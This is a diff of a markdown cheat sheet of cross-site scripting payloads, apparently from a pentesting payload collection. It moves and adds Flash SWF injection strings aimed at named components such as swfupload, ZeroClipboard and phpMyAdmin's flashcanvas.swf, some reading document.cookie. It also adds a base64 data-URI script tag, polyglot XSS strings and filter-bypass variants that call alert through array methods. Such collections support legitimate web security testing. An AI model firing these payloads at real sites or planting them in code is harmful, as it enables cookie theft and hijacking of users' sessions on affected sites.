@@ -83,26 +83,6 @@ With an additional URL
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
 ```
 
-XSS in flash application
-```
-flashmediaelement.swf?jsinitfunctio%gn=alert`1`
-flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
-ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
-swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
-swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
-plupload.flash.swf?%#target%g=alert&uid%g=XSS&
-moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
-video-js.swf?readyFunction=alert(1)
-player.swf?playerready=alert(document.cookie)
-player.swf?tracecall=alert(document.cookie)
-banner.swf?clickTAG=javascript:alert(1);//
-io.swf?yid=\"));}catch(e){alert(1);}//
-video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
-bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
-flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
-phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
-```
-
 XSS in Hidden input
 ```
 <input type="hidden" accesskey="X" onclick="alert(1)">
@@ -159,6 +139,7 @@ XSS with data:
 ```
 data:text/html,<script>alert(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 ```
 
 XSS with vbscript: only IE
@@ -200,7 +181,7 @@ XSS in SVG (short)
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 ```
 
-XSS in SWF
+XSS in SWF flash application
 ```
 Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
 IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
@@ -213,8 +194,28 @@ open url to new window: InsecureFlashFile.swf?a=open&c=http://www.google.com/
 http request to url: InsecureFlashFile.swf?a=get&c=http://www.google.com/
 eval js codz: InsecureFlashFile.swf?a=eval&c=alert(document.domain)
 ```
-
 more payloads in ./files
+
+
+XSS in SWF flash application
+```
+flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
+ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
+swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
+swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
+plupload.flash.swf?%#target%g=alert&uid%g=XSS&
+moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
+video-js.swf?readyFunction=alert(1)
+player.swf?playerready=alert(document.cookie)
+player.swf?tracecall=alert(document.cookie)
+banner.swf?clickTAG=javascript:alert(1);//
+io.swf?yid=\"));}catch(e){alert(1);}//
+video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
+bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
+flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
+phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
+```
 
 
 
@@ -412,6 +413,17 @@ javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
 /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
 ```
 
+Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
+![https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg](https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg)
+```
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+```
+![https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large](https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large)
+```
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+```
+
+
 
 ## Filter Bypass and exotic payloads
 
@@ -491,16 +503,22 @@ foo="text </script><script>alert(1)</script>";
 </script>
 ```
 
-Bypass using an alternate way to execute an alert
+Bypass using an alternate way to execute an alert - [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040)
 ```
-<script>window['alert'](0)</script>
-<script>parent['alert'](1)</script>
-<script>self['alert'](2)</script>
-<script>top['alert'](3)</script>
-<script>this['alert'](4)</script>
-<script>frames['alert'](5)</script>
-<script>content['alert'](6)</script>
+window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
 
+[7].map(alert)
+[8].find(alert)
+[9].every(alert)
+[10].filter(alert)
+[11].findIndex(alert)
+[12].forEach(alert);
 ```
 
 Bypass using an alternate way to trigger an alert
@@ -677,3 +695,5 @@ Try here : https://brutelogic.com.br/xss.php?c3=%27;Notification.requestPermissi
 * http://d3adend.org/xss/ghettoBypass
 * http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
 * http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html
+* https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5
+* https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309
